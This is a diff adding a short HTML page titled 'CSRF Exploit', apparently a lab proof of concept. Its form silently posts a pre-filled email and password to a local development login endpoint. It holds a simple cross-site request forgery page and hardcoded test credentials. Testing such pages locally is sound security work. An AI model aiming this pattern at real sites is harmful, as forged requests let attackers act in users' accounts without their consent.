@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Exploit</title>
+</head>
+<body>
+    <h1>CSRF Exploit</h1>
+    <p>Please fill in your login credentials and click "Submit".</p>
+    <!-- url: http://localhost:5173/ -->
+     <!-- url: http://localhost/webApp/project/login.php -->
+    <form action="http://localhost:5173/" method="POST">
+        <div>
+            <label for="email">Email:</label>
+            <input type="text" name="email" value="jay@mail.com" required>
+        </div>
+        <div>
+            <label for="password">Password:</label>
+            <input type="text" name="password" value="jay@123" required>
+        </div>
+        <button type="submit">Submit</button>
+    </form>
+</body>
+</html>
